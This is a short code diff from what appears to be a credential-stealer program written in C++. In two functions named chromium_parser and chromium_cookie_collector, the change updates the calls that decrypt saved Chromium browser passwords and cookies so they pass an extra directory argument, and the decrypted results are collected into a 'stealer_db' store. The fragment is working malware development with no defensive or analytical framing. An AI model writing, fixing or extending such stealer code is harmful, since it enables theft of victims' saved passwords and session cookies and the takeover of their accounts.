@@ -114,7 +114,7 @@ BOOL chromium_parser(std::string username, std::string stealer_db)
 							try
 							{
 								//decrypt password here
-								std::string decrypted_password = obj.AESDecrypter(password);
+								std::string decrypted_password = obj.AESDecrypter(password, dir);
 								data.get_password_manager().setPassword(decrypted_password);
 							}
 							catch (int e)
@@ -240,7 +240,7 @@ BOOL chromium_cookie_collector(std::string username, std::string stealer_db)
 							try
 							{
 								//decrypt cookies here
-								std::string decrypted_cookies = obj.AESDecrypter(cookies);
+								std::string decrypted_cookies = obj.AESDecrypter(cookies, dir);
 
 								if (decrypted_cookies.empty())
 									continue;
